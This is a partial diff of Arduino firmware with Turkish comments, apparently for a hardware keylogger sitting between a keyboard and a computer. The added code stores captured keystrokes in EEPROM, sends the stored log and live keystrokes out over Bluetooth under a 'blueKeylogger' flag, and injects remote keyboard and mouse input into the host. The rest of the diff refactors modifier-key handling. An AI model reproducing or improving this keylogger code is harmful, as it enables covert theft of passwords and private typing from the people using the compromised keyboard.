+        if(BT_1.isListening())
+        {
+          BT_1.print(char(readEEPROM(disk1, i)));
+          delay(3);
+          k = i;
+          debug();
+        }
+      }
+      eeprom_Sented = 1;
+    }
+    BT_1.print(BLUETOOTH_KEYWORD);
+    delay(100);
+  }
+}
+
+void EEPROM_Key_Saver()
+{
+  if(is_EEPROM_open == 1 && eeprom_tut == 0)
+  {
+    writeEEPROM(disk1, ((int)readEEPROM(disk1, 1)) + 1, byte(keyes));
+    writeEEPROM(disk1, 1, readEEPROM(disk1, 1) + byte(1));
+    eeprom_tut = 1;
+    debug();
+    keyes;
+  }
+}
+
+void Live_Key_Transmit() 
+{
+  if(FUNCTION_LIVE)
+  {
+    if (blueKeylogger == 1 && blueKeyIn == 1) 
+    {
+      BT_1.print(lastButton);
+      blueKeyIn = 0;
+    }
+  }
+}
+
+void Bluetooth_Key_Write() 
+{
+  if(FUNCTION_KEYBOARD)
+  {
+    if (blueCommit == 1) 
+    {
+      Keyboard.print(input_byteData); //print char as recieved byte by byte
+      blueCommit = 0;
+    }
+  }
+}
+
+void Bluetooth_Mouse_Write() 
+{
+  if(FUNCTION_MOUSE)
+  {
+    if(input_byteData == '!')
+    {
+      printed = "";
+    }
+    if(input_byteData == '/')
+    {
+      x = printed.toInt();
+      Mouse.move(-(x), 0, 0);
+      printed = "";
+    }
+    if(input_byteData == '*')
+    {
+      y = printed.toInt();
+      Mouse.move(0, -(y), 0);
+      printed = "";
+    }
+    debug();
+  }
+}
+
+void Key_Write_Normal() // normal tuslarin seri yazdirilmasi, controlKeyChecked == 0 yani kombinasyon tusuna basiliyorsa donguyu calistirma
 {
 
-  if (yeniZaman - eskiZaman > 1300 && tut == 0 && controlKeyChecked == 0) { // normal tuslarin seri yazdirilmasi, controlKeyChecked == 0 yani kombinasyon tusuna basiliyorsa donguyu calistirma
+  if (yeniZaman - eskiZaman > 1300 && tut == 0 && controlKeyChecked == 0) { 
     Keyboard.print(keyes);
     delay(35);
   }
 }
 
-void specialKeyWrite() 
-{
+void Key_Write_Special() // special_tut == 1 yani ozel tusa basilmis f1,f2,f3,tab,enter,home gibi, ozel tus bu sekilde seri yazdirilir
+{                      // controlKeyChecked == 0 yani kombinasyon tusuna basiliyorsa donguyu calistirma
 
-  if (SPECIAL_yeniZaman - SPECIAL_eskiZaman > 1300 && tut == 0 && special_tut == 1 && controlKeyChecked == 0) { // special_tut == 1 yani ozel tusa basilmis f1,f2,f3,tab,enter,home gibi, ozel tus bu sekilde seri yazdirilir
-    Keyboard.press(specialChar);                                                                                // controlKeyChecked == 0 yani kombinasyon tusuna basiliyorsa donguyu calistirma
+  if (SPECIAL_yeniZaman - SPECIAL_eskiZaman > 1300 && tut == 0 && special_tut == 1 && controlKeyChecked == 0) { 
+    Keyboard.press(specialChar);                                                                                
   }
 }
 
-void combineKeyWrite() 
+void Key_Write_Combine() 
 {
 
   if (ctrlControl == 1 && (special_tut == 1 || tut == 0)) {
     if (left_ctrlEnabled == 1) {
-      Keyboard.press(leftCtrl);
+      Keyboard.press(KEY_LEFT_CTRL);
     }
     else if (right_ctrlEnabled == 1) {
-      Keyboard.press(rightCtrl);
+      Keyboard.press(KEY_RIGHT_CTRL);
     }
   }
 
   if (altControl == 1 && (special_tut == 1 || tut == 0)) {
     if (left_altEnabled == 1) {
-      Keyboard.press(leftAlt);
+      Keyboard.press(KEY_LEFT_ALT);
     }
     else if (right_altEnabled == 1) {
-      Keyboard.press(rightAlt);
+      Keyboard.press(KEY_RIGHT_ALT);
     }
   }
 
   if (shiftControl == 1 && (special_tut == 1 || tut == 0)) {
     if (left_shiftEnabled == 1) {
-      Keyboard.press(leftShift);
+      Keyboard.press(KEY_LEFT_SHIFT);
     }
     else if (right_shiftEnabled == 1) {
-      Keyboard.press(rightShift);
+      Keyboard.press(KEY_RIGHT_SHIFT);
     }
   }
 
   if (guiControl == 1 && (special_tut == 1 || tut == 0)) {
     if (left_guiEnabled == 1) {
-      Keyboard.press(leftGUI);
+      Keyboard.press(KEY_LEFT_GUI);
     }
     else if (right_guiEnabled == 1) {
-      Keyboard.press(rightGUI);
+      Keyboard.press(KEY_RIGHT_GUI);
     }
   }
 
 }
 
-void fingerUp() 
+void Combine_Key_Up() 
 {
 
   if (controlKeyChecked == 2) { // ctrl - shift - alt - gui tuslarindan parmagimizi cektik
@@ -684,8 +963,8 @@ void fingerUp()
     ctrlControl = 0; // tekrar icin gerekli
     left_ctrlEnabled = 0;
     right_ctrlEnabled = 0;
-    Keyboard.release(leftCtrl);
-    Keyboard.release(rightCtrl);
+    Keyboard.release(KEY_LEFT_CTRL);
+    Keyboard.release(KEY_RIGHT_CTRL);
   }
 
   if (altControl == 2) { // alt tusundan parmagimizi cektik
@@ -693,8 +972,8 @@ void fingerUp()
     altControl  = 0; // tekrar icin gerekli
     left_altEnabled = 0;
     right_altEnabled = 0;
-    Keyboard.release(leftAlt);
-    Keyboard.release(rightAlt);
+    Keyboard.release(KEY_LEFT_ALT);
+    Keyboard.release(KEY_RIGHT_ALT);
   }
 
   if (shiftControl == 2) { // shift tusundan parmagimizi cektik
@@ -702,8 +981,8 @@ void fingerUp()
     shiftControl = 0; // tekrar icin gerekli
     left_shiftEnabled = 0;
     right_shiftEnabled = 0;
-    Keyboard.release(leftShift);
-    Keyboard.release(rightShift);
+    Keyboard.release(KEY_LEFT_SHIFT);
+    Keyboard.release(KEY_RIGHT_SHIFT);
   }
 
   if (guiControl == 2) { // gui tusundan parmagimizi cektik
@@ -711,8 +990,8 @@ void fingerUp()
     guiControl = 0; // tekrar icin gerekli
     left_guiEnabled = 0;
     right_guiEnabled = 0;
-    Keyboard.release(leftGUI);
-    Keyboard.release(rightGUI);
+    Keyboard.release(KEY_LEFT_GUI);
+    Keyboard.release(KEY_RIGHT_GUI);
   }
 
   // kombinasyon icin bastigimiz normal tustan parmagimizi cektik
@@ -729,7 +1008,7 @@ void fingerUp()
 
 }
 
-void combineElse() 
+void Combine_Unavaible() 
 {
 
   if ((ctrlControl == 1 || altControl == 1 || shiftControl == 1 || guiControl == 1) && tut == 0 && combinePress == 0)  { // burasi hatali, ilk basimda eski lastbutton geliyor
